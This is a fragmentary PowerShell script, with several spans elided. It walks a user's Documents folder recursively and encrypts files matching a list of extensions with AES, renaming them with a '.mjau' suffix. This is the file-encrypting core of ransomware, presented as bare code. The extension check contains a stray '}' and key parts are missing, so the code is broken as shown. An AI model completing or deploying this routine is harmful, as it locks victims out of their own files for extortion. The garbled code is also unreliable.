...
$user = "C:\Users\c202c8s\Documents"
$suffix = ".mjau"
$files = Get-ChildItem -Recurse -Path $user -File 
...
for ($i = 0; $i -lt $files.Length; $i++)
{
    ...
    {
        $a = $files[$i] | select name
        if ([System.IO.Path]::GetExtension($a) -eq $extensions[$j] + "}")
        {
            #$files[$i]
           $files[$i] | Protect-File -Suffix $suffix -Algorithm AES
